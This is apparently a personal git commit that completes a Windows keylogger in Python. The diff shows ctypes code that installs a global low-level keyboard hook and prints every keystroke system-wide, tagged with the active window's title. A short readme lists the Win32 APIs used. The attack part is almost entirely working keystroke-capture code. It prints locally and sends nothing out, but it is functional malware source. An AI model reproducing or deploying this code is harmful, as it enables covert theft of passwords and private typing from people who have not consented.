4a871ed6e589a3720b76f0a00688d7914696fed9
DUDLEYDANIEL <dudleydaniel.raj2005@gmail.com>
2024-10-16 10:01:44 +0530

    finished the keylogger

--- Keylogger.py
+++ Keylogger.py
@@ -1,45 +1,36 @@
 from ctypes import *
 from ctypes import wintypes
 
-"""
-hooks in Win32API are used to monitor and respond events such as messages, keystrokes, mouseactions etc...
-"""
-
-# defining constants
+# Defining constants
 user32 = windll.user32
 LRESULT = c_long
-WH_KEYBOARD_LL = 13  # installs the hook procedure to monitor
-WM_KEYDOWN = (
-    0x0100  # A nonsystem key is a key that is pressed when the ALT key is not pressed.
-)
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
 WM_RETURN = 0x0D
 WM_SHIFT = 0x10
 
-
-# this GetWindowTextLengthA API is used to get the length of the text associated with the window A denotes return the output as unicode
-# GetWindowTextLenthW returns the output in the unicode format
+#function to get the length of the text
 GetWindowTextLengthA = user32.GetWindowTextLengthA
-GetWindowTextLengthA.argtypes = (wintypes.HANDLE,)
+GetWindowTextLengthA.argtypes = (wintypes.HWND,)
 GetWindowTextLengthA.restype = wintypes.INT
 
-
-# GetWindowTextA function used to retrieve the text associated with the comtrol bars such as the windows, buttons , edit box 'A' denotes the output is ANSI
+#function to get the text
 GetWindowTextA = user32.GetWindowTextA
-GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
+GetWindowTextA.argtypes = (wintypes.HWND, wintypes.LPSTR, wintypes.INT)
 GetWindowTextA.restype = wintypes.INT
 
-# GetKeyState function is used to retrive the status of the virtual space of the keyboard whether the key is pressed or toggled
+#to get the toggled state of the particular key(pressed / not)
 GetKeyState = user32.GetKeyState
 GetKeyState.argtypes = (wintypes.INT,)
 GetKeyState.restype = wintypes.SHORT
 
-# GetKeyboardState function is used to copy and the status of the 256 vitual key to specified buffer
-KeyboardState = wintypes.PBYTE * 256
+# get status of all the keys in the keyboard
+KeyboardState = wintypes.BYTE * 256
 GetKeyboardState = user32.GetKeyboardState
 GetKeyboardState.argtypes = (POINTER(KeyboardState),)
 GetKeyboardState.restype = wintypes.BOOL
 
-# ToAscii function converts the virtual keycode and keyboard state to corresponding characters
+# convert the captured signals to ascii signals
 ToAscii = user32.ToAscii
 ToAscii.argtypes = (
     wintypes.UINT,
@@ -50,7 +41,7 @@ ToAscii.argtypes = (
 )
 ToAscii.restype = wintypes.INT
 
-# CallNextHookEx function is used to call the procedure of next hook to current hook chain , this function inturupts the keyboard or the mouse events
+# pass the handle or the info to the next process in the hook chain
 CallNextHookEx = user32.CallNextHookEx
 CallNextHookEx.argtypes = (
     wintypes.HHOOK,
@@ -60,26 +51,21 @@ CallNextHookEx.argtypes = (
 )
 CallNextHookEx.restype = LRESULT
 
-# SetWindowsHookExA used to install the certain hook procedure into the hook chain to monitor system for certain events
-HOOKPROC = CFUNCTYPE(LRESULT, wintypes.WPARAM, wintypes.LPARAM)
+#function to install a hook procedure into an system
 SetWindowsHookExA = user32.SetWindowsHookExA
 SetWindowsHookExA.argtypes = (
     wintypes.INT,
-    HOOKPROC,
+    CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM),
     wintypes.HINSTANCE,
     wintypes.DWORD,
 )
 SetWindowsHookExA.restype = wintypes.HHOOK
 
 
-# GetMessage function dispatches incoming sent messages until a posted message is available for retrieval.
+# getting the hook message from the handle
 GetMessage = user32.GetMessageW
 GetMessage.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
 GetMessage.restype = wintypes.BOOL
-
-
-# this structure helps us to identify which key is pressed
-
 
 class KBDLLHOOKSTRUCT(Structure):
     _fields_ = [
@@ -87,22 +73,51 @@ class KBDLLHOOKSTRUCT(Structure):
         ("scanCode", wintypes.DWORD),
         ("flags", wintypes.DWORD),
         ("time", wintypes.DWORD),
-        (
-            "dwExtraInfo",
-            wintypes.DWORD,
-        ),
+        ("dwExtraInfo", wintypes.ULONG),
     ]
 
-
-def get_foreground_process():  # this function Retrieves a handle to the foreground window (the window with which the user is currently working).
+# Retrieve the foreground window's process name
+def get_foreground_process():
     hwnd = user32.GetForegroundWindow()
-    length = GetWindowTextLengthA(
-        hwnd
-    )  # gets the length text to understand which is the user currently running
-    buf = create_string_buffer(length + 1)
-    GetWindowTextA(hwnd, buf, length)  # this will copy the text from handle to buffer
-    return buf.value
+    length = GetWindowTextLengthA(hwnd)
+    if length > 0:
+        buf = create_string_buffer(length + 1)  # +1 for null terminator
+        GetWindowTextA(hwnd, buf, length + 1)
+        return buf.value
+    return b"(unknown)"
 
+# Hook function to capture key events
+def hook_function(nCode, wParam, lParam):
+    global last, hook
+    if nCode == 0:  # Process the message only if nCode is HC_ACTION (0)
+        if last != get_foreground_process():
+            last = get_foreground_process()
+            print("\n[{}]".format(last.decode("latin-1")))
 
-print(get_foreground_process())
+        if wParam == WM_KEYDOWN:
+            keyboard = KBDLLHOOKSTRUCT.from_address(lParam)
 
+            # Check the state of the keyboard and process the key press
+            state = (wintypes.BYTE * 256)()
+            GetKeyboardState(byref(state))
+
+            buf = (c_ushort * 1)()
+            n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)
+
+            if n > 0:  # If ToAscii succeeded
+                if keyboard.vkCode == WM_RETURN:
+                    print()  # Print newline for Enter key
+                else:
+                    print("{}".format(string_at(buf).decode("latin-1")), end="", flush=True)
+
+    return CallNextHookEx(hook, nCode, wParam, lParam)
+
+last = None
+hook_proc = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_function)
+
+# Set the low-level keyboard hook
+hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, 0, 0)
+
+# Enter message loop to capture key events
+msg = wintypes.MSG()
+GetMessage(byref(msg), 0, 0, 0)
---
+++ readme.md.txt
@@ -0,0 +1,10 @@
+This is a Keylogger program using the python ctypes module, by directly interacting with the Windows API:
+
+The Main API used for this program with reference to the official windows api documentation:
+* GetWindowTextLengthA
+* GetWindowTextA
+* GetKeyState
+* GetKeyboardState
+* ToAscii
+* callNextHookExA
+* GetnextHook
